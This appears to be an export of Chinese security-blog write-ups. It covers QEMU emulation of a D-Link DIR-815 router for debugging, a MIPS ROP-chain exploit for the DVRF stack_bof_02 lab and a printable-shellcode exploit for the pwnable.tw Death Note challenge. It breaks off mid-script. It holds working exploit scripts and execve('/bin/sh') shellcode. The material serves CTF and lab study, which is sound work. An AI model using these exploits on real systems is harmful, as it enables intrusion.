&#123;</span><br><span class="line">        <span class="type">text</span>/html    &#123; html htm &#125;</span><br><span class="line">        <span class="type">text</span>/<span class="type">xml</span>    &#123; <span class="type">xml</span> &#125;</span><br><span class="line">        <span class="type">text</span>/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        <span class="type">text</span>/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">External</span></span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Server</span></span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    <span class="keyword">Family</span> <span class="type">inet</span></span><br><span class="line">    Interface eth0  #对应qemu仿真路由器系统的网卡</span><br><span class="line">    Address <span class="number">192.168</span><span class="number">.107</span><span class="number">.135</span> #qemu仿真路由器系统的IP</span><br><span class="line">    Port &quot;80&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">Alias</span> /</span><br><span class="line">            <span class="keyword">Location</span> /htdocs/web</span><br><span class="line">            IndexNames &#123; <span class="keyword">index</span>.php &#125;</span><br><span class="line">            <span class="keyword">External</span></span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">Alias</span> /HNAP1</span><br><span class="line">            <span class="keyword">Location</span> /htdocs/HNAP1</span><br><span class="line">            <span class="keyword">External</span></span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; <span class="keyword">index</span>.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着在物理机上<code>/opt/tools/mipsel</code>目录中新建 <code>init.sh</code> 文件，写入以下内容，并执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>然后在qemu中的squashfs-root目录下创建<code>init.sh</code>文件，写入以下内容，并执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>

<p>最后进到qemu的<code>/squashfs-root/sbin</code>目录下，执行<code>./httpd -f /root/squashfs-root/http_conf</code>后，便能在宿主机上正常访问<a href="http://192.168.107.135/hedwig.cgi">http://192.168.107.135/hedwig.cgi</a></p>
<p>如下：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301648531.png" alt="image-20250325224040482"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot;|./gdbserver.mipsle 192.168.107.128:6666 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|/htdocs/web/hedwig.cgi</span></span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_1">原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a href="https://zikh26.github.io/posts/d1f081a9.html#%E8%BF%90%E8%A1%8C%E6%97%B6%E6%8A%A5%E9%94%99">D-Link DIR-815路由器溢出漏洞分析 | ZIKH26’s Blog</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>DVRF题目之MIPS栈溢出中ROP链的构造</title>
    <url>/2025/05/29/DVRF%E9%A2%98%E7%9B%AE%E4%B9%8BMIPS%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%ADROP%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0/</url>
    <content><![CDATA[<p>本文对DVRF路由器漏洞靶机中的一道题目（<code>stack_bof_02</code>）进行了复现，详细记录了复现过程中如何利用<code>gadget</code>片段来构造<code>ROP</code>链进行攻击。</p>
<span id="more"></span>

<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>直接看<code>main</code>函数：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505291501125.png" alt="image-20250529133717913" style="zoom:50%;" />

<p>漏洞点在第14行，<code>strcpy</code>函数会把命令行参数<code>argv[1]</code>复制到<code>v4</code>中，造成栈溢出且<code>argv[1]</code>可控。程序中并没有给出后门函数，只能执行<code>shellcode</code>来攻击。</p>
<h2 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h2><h3 id="调用sleep函数"><a href="#调用sleep函数" class="headerlink" title="调用sleep函数"></a>调用sleep函数</h3><p>通常将<code>shellcode</code>写到某个区域时，这块区域是作为数据缓存区来存放的，在执行<code>shellcode</code>的时候该区域又必须是指令缓存区，但是在<code>MIPS</code>架构中指令缓存区和数据缓存区的同步是需要一个时间的，也就是说在我们写入<code>shellcode</code>后不能立即将其执行，需要一个<code>sleep</code>来等待缓存区同步。</p>
<p>因为要先设置<code>$a0</code>为1作为<code>sleep</code>函数的参数，故可以找到如下<code>gadget1</code>：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505291502808.png" alt="image-20250528003123823" style="zoom: 67%;" />

<p>可知这段代码最后会跳转到<code>$s1</code>中的地址，因此还需要一个gadget2，使在执行gadget1前可以控制<code>$s1</code>为下一个跳转地址。</p>
<p>利用<code>mipsrop.find(&quot;lw $s1,&quot;)</code>可以找到如下<code>gadget2</code>：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505291501092.png" alt="image-20250528005120082" style="zoom: 67%;" />

<p>先执行gadget2，设置<code>$ra</code>为gadget1的地址、设置<code>$s1</code>为目标地址，然后跳转执行gadget1，设置<code>$a0</code>为1，最后跳转到<code>$s1</code>中的地址。因为<code>jalr</code>指令在跳转前还会将<code>PC</code>加<code>8</code>作为返回地址存入<code>$ra</code>寄存器，这样我们在执行完<code>sleep</code>后就不能继续控制程序流了，所以不能将<code>$s1</code>设置为<code>sleep_addr</code>来通过<code>jalr</code>跳转。</p>
<p>还需要一个gadget3来，要求是可以通过<code>jr</code>跳转到<code>sleep</code>函数，并且可以控制<code>$ra</code>寄存器（执行完<code>sleep</code>会执行<code>jr $ra</code>返回）。</p>
<p>利用<code>mipsrop.tails()</code>可以找到如下<code>gadget3</code>：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505291501240.png" alt="image-20250528003524356" style="zoom:67%;" />

<p>现在先执行gadget2，设置<code>$ra</code>为gadget1的地址、<code>$s1</code>为gadget3的地址、<code>$s2</code>为<code>sleep_addr</code>；然后<code>jr $ra</code>跳转执行gadget1，设置<code>$a0</code>为1；然后<code>jalr $t9($s1)</code>跳转执行gadget3，设置<code>$ra</code>为目标地址（目前未知用<code>0xdeadbeef</code>替代）作为<code>sleep</code>函数的返回地址；然后<code>jr $t9(s2)</code>跳转执行<code>sleep</code>函数，执行完后便能返回到目标地址。</p>
<p>构造的payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = <span class="number">0x7f6ea420</span>-<span class="number">0x17420</span></span><br><span class="line">sleep = libc+<span class="number">0x2f2b0</span></span><br><span class="line">gadget2 = libc+<span class="number">0x7730</span></span><br><span class="line"><span class="comment"># lw $ra,0x18+var_s10($sp)</span></span><br><span class="line"><span class="comment"># lw $s2,0x18+var_s8($sp)</span></span><br><span class="line"><span class="comment"># lw $s1,0x18+var_s4($sp)</span></span><br><span class="line"><span class="comment"># jr $ra</span></span><br><span class="line">gadget3 = libc+<span class="number">0x20f1c</span></span><br><span class="line"><span class="comment"># move $t9,$s2</span></span><br><span class="line"><span class="comment"># lw $ra,0x18+var_sC($sp)</span></span><br><span class="line"><span class="comment"># jr $t9</span></span><br><span class="line">gadget1 = libc+<span class="number">0x2fb10</span></span><br><span class="line"><span class="comment"># li $a0,1</span></span><br><span class="line"><span class="comment"># move $t9,$s1</span></span><br><span class="line"><span class="comment"># jalr $t9</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1fc</span>+p32(gadget2)</span><br><span class="line">payload+= <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>-<span class="number">12</span>)+p32(gadget3)+p32(sleep)+<span class="string">b&#x27;sss3&#x27;</span>+p32(gadget1)</span><br><span class="line"><span class="comment">#                             $s1        $s2       $s3        $ra</span></span><br><span class="line">payload+= <span class="string">b&#x27;c&#x27;</span>*(<span class="number">0x2c</span>-<span class="number">16</span>)+<span class="string">b&#x27;sss0&#x27;</span>+<span class="string">b&#x27;sss1&#x27;</span>+<span class="string">b&#x27;sss2&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment">#                           $s0                        $ra</span></span><br></pre></td></tr></table></figure>

<h3 id="调用shellcode"><a href="#调用shellcode" class="headerlink" title="调用shellcode"></a>调用shellcode</h3><p>接下来就是要执行<code>shellcode</code>了，因为<code>shellcode</code>会被布置到栈上，所以我们需要一个可以把栈地址写到寄存器里的gadget4，利用<code>mipsrop.stackfinders()</code>进行搜索，可以找到如下<code>gadget4</code>：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505291501760.png" alt="image-20250529003539837" style="zoom:67%;" />

<p>在执行gadget3时将<code>$ra</code>设置为gadget4的地址，执行完<code>sleep</code>函数便能返回执行gadget4，gadget4会把<code>$sp+0x38+var_20</code>处的地址存储到<code>$a0</code>中，因此需要把<code>shellcode</code>写到<code>$sp+0x38+var_20</code>处，接着<code>jalr</code>跳转到<code>$s0</code>中的地址，因此在执行gadget3的时候还需要把<code>$s0</code>设置为下一个目标地址。</p>
<p>最后还需要一个gadget5用来跳转到<code>$a0</code>中的地址，直接<code>mipsrop.find(&quot;move $t9,$a0&quot;)</code>搜索即可：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505291501155.png" alt="image-20250529003933377" style="zoom:67%;" />

<p>这段gadget还会执行一个<code>sw</code>将<code>$v0</code>的值写到栈上<code>0x30+var_18($sp)</code>处，调试的过程中发现这里正好是存储<code>shellcode</code>的首地址，因此在布置<code>shellcode</code>时多填充一个内存单元即可。</p>
<p>编写<code>shellcode</code>时还需要注意由于溢出函数是<code>strcpy</code>函数会有<code>00</code>截断，所以<code>shellcode</code>的机器码中不能含有<code>\x00</code>。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li $t0,0x6e69622f</span></span><br><span class="line"><span class="string">li $t1,0x68732f2f</span></span><br><span class="line"><span class="string">sw $t0,-0x10($sp)</span></span><br><span class="line"><span class="string">sw $t1,-0xc($sp)</span></span><br><span class="line"><span class="string">sw $a2,-0x8($sp)</span></span><br><span class="line"><span class="string">la $a0,-0x10($sp)</span></span><br><span class="line"><span class="string">slti $a1,$zero,-1</span></span><br><span class="line"><span class="string">slti $a2,$zero,-1</span></span><br><span class="line"><span class="string">addi $v0,$zero,4011</span></span><br><span class="line"><span class="string">syscall 0x10101</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">libc = <span class="number">0x7f6ea420</span>-<span class="number">0x17420</span></span><br><span class="line">sleep = libc+<span class="number">0x2f2b0</span></span><br><span class="line">gadget2 = libc+<span class="number">0x7730</span></span><br><span class="line"><span class="comment"># lw $ra,0x18+var_s10($sp)</span></span><br><span class="line"><span class="comment"># lw $s2,0x18+var_s8($sp)</span></span><br><span class="line"><span class="comment"># lw $s1,0x18+var_s4($sp)</span></span><br><span class="line"><span class="comment"># jr $ra</span></span><br><span class="line">gadget3 = libc+<span class="number">0x20f1c</span></span><br><span class="line"><span class="comment"># move $t9,$s2addiu $sp,$sp,-0x10</span></span><br><span class="line"><span class="comment"># lw $ra,0x18+var_sC($sp)</span></span><br><span class="line"><span class="comment"># jr $t9</span></span><br><span class="line">gadget1 = libc+<span class="number">0x2fb10</span></span><br><span class="line"><span class="comment"># li $a0,1</span></span><br><span class="line"><span class="comment"># move $t9,$s1</span></span><br><span class="line"><span class="comment"># jalr $t9</span></span><br><span class="line">gadget4 = libc+<span class="number">0x16dd0</span></span><br><span class="line">gadget5 = libc+<span class="number">0x214a0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1fc</span>+p32(gadget2)</span><br><span class="line">payload+= <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>-<span class="number">12</span>)+p32(gadget3)+p32(sleep)+<span class="string">b&#x27;sss3&#x27;</span>+p32(gadget1)</span><br><span class="line"><span class="comment">#                             $s1        $s2       $s3        $ra</span></span><br><span class="line">payload+= <span class="string">b&#x27;c&#x27;</span>*(<span class="number">0x2c</span>-<span class="number">16</span>)+p32(gadget5)+<span class="string">b&#x27;sss1&#x27;</span>+<span class="string">b&#x27;sss2&#x27;</span>+p32(gadget4)</span><br><span class="line"><span class="comment">#                            $s0         $s1,$s2     $ra</span></span><br><span class="line">payload+= <span class="string">b&#x27;d&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+shellcode</span><br><span class="line"><span class="comment"># p = process([&quot;qemu-mipsel&quot;,&quot;./stack_bof_02&quot;,payload])</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>,<span class="string">&quot;./stack_bof_02&quot;</span>,payload])</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#0x0040091C</span></span><br></pre></td></tr></table></figure>

<p>攻击效果如下：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505291502717.png" alt="QQ_1748496852704"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/172126#h2-0">路由器漏洞挖掘之栈溢出入门（三）ROP链的构造</a></p>
<p><a href="https://www.mrskye.cn/archives/6f13cd09/#EXP-1">DVRF 路由器漏洞靶机题目笔记</a></p>
<p><a href="https://www.cnblogs.com/hetianlab/p/18840600">MIPS栈溢出漏洞实战解析：从DVRF题目看ROP链构造</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-Death Note</title>
    <url>/2024/07/27/Death-Note/</url>
    <content><![CDATA[<h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li><p>认识了三个汇编指令，<br><code>dec</code>：将操作数的值减去<code>1</code>。如，<code>edx</code>的值原来为<code>0x30</code>，执行<code>dec edx</code>后，<code>edx</code>的值变为<code>0x2f</code>。<br><code>inc</code>：将操作数的值加上<code>1</code>。如，<code>eax</code>的值原来为<code>0</code>，执行<code>inc eax</code>后，<code>eax</code>的值变为<code>0x1</code>。</p>
<span id="more"></span>

<p><code>xor</code>：将两个操作数的值进行异或。异或，两个二进制数，对应位异或，同为<code>0</code>，不同为<code>1</code>。</p>
</li>
<li><p>对于<code>32</code>位的寄存器<code>edx</code>，<code>dl</code>是其低<code>8</code>位，即最后<code>1</code>个字节；<code>dh</code>是其高<code>8</code>位，即第<code>1</code>个字节。</p>
</li>
<li><p>对于<code>syscall</code>和<code>int 0x80</code>的不可见字符汇编代码编写，<br><code>syscall</code>的机器码是<code>\x0f\x05</code>，<code>int 0x80</code>的机器码是<code>\xCD\x80</code>。这两个指令都是汇编指令，故其在内存中的存储形式是机器码。也就是说，如果<code>0x08048020</code>这个地址里，存储的数据是<code>0x80cd</code>，便可以理解为地址<code>0x08048020</code>存储着<code>int 0x80</code>这个指令。</p>
</li>
</ol>
<h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>程序没有开<em>pie</em>保护，可能要用到<em>shellcode</em>。程序主要功能是实现<em>chunk</em>的创建，打印，删除。在创建<em>chunk</em>的时候，有一个索引越界漏洞，我们可以通过输入负数，覆盖<em>note</em>数组前面的内容为<em>chunk_hook</em>。</p>
<p>通过以上方法，覆盖<code>free@got.plt</code>，为一个<em>chunk_hook</em>，该<em>chunk_hook</em>指向<em>chunk</em>的<em>user_data</em>。如果我们把<em>shellcode</em>布置在<em>chunk</em>中，那么在删除<em>chunk</em>的时候，便会执行<em>shellcode</em>。</p>
<p>该题考察了关于可见字符<em>shellcode</em>的编写，不能使用<em>mov</em>，<em>syscall</em>，<em>int 0x80</em>等，我便学习用<em>push,pop,dec,inc,xor</em>来编写<code>32</code>位的<em>execve</em>的系统调用。</p>
<h4 id="dec"><a href="#dec" class="headerlink" title="dec"></a><em>dec</em></h4><blockquote>
<p>汇编指令<code>dec</code>是”decrement”的缩写，意思是将操作数的值减去1。在汇编语言中，<code>dec</code>指令通常用于减少寄存器或内存位置中的数值。例如，如果有一个寄存器A的当前值为5，执行<code>dec A</code>后，寄存器A的值将变为4。</p>
<p><code>dec</code>指令可以应用于不同的上下文和数据类型，具体行为可能因使用的CPU架构和汇编语言的变种而有所不同。在一些架构中，<code>dec</code>可能只影响无符号整数，而在其他架构中，它可能适用于有符号整数。使用时需要参考特定处理器的指令集架构（ISA）文档。</p>
</blockquote>
<h4 id="inc"><a href="#inc" class="headerlink" title="inc"></a><em>inc</em></h4><blockquote>
<p>汇编指令<code>inc</code>是”increment”的缩写，意思是将操作数的值增加1。这个指令通常用于寄存器或内存位置中的数值增加操作。</p>
<p>例如，如果有一个寄存器B的当前值为3，执行<code>inc B</code>后，寄存器B的值将变为4。</p>
<p>与<code>dec</code>指令类似，<code>inc</code>的具体行为可能因使用的CPU架构和汇编语言的变种而有所不同。在某些架构中，<code>inc</code>可能只影响无符号整数，而在其他架构中，它可能适用于有符号整数。使用时同样需要参考特定处理器的指令集架构（ISA）文档。</p>
</blockquote>
<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a><em>shellcode</em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#execve(&quot;/bin/sh&quot;,0,0) eax = 11</span><br><span class="line">#ebx,ecx,edx</span><br><span class="line">/*   将&#x27;/bin//sh&#x27;的地址放到ebx中</span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">push edx</span><br><span class="line">*/</span><br><span class="line">dec edx   #edx-1</span><br><span class="line">dec edx</span><br><span class="line">xor [eax+36], dl</span><br><span class="line">xor [eax+37], dl</span><br><span class="line">pop edx</span><br><span class="line">/*   eax = 11</span><br><span class="line">push ecx</span><br><span class="line">pop eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax	</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10201</span>)</span><br><span class="line">debug(p,<span class="number">0x080489EF</span>,<span class="number">0x080489FD</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Name :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push ebx</span></span><br><span class="line"><span class="string">	push 0x68732f2f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	push esp</span></span><br><span class="line"><span class="string">	pop ebx</span></span><br><span class="line"><span class="string">    dec ecx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    xor [eax+56],dl</span></span><br><span class="line"><span class="string">    xor [eax+57],dl</span></span><br><span class="line"><span class="string">	pop edi</span></span><br><span class="line"><span class="string">    pop edi</span></span><br><span class="line"><span class="string">	pop eax</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\x3a\x77&#x27;</span></span><br><span class="line">add(-<span class="number">19</span>,shellcode)</span><br><span class="line">delete(-<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10201</span>)</span><br><span class="line">debug(p,<span class="number">0x080489EF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Name :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push ebx</span></span><br><span class="line"><span class="string">	push 0x68732f2f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	push esp</span></span><br><span class="line"><span class="string">	pop ebx</span></span><br><span class="line"><span class="string">	push edx</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	xor [eax+36], dl</span></span><br><span class="line"><span class="string">	xor [eax+37], dl</span></span><br><span class="line"><span class="string">	pop edx</span></span><br><span class="line"><span class="string">	push ecx</span></span><br><span class="line"><span class="string">	pop eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc 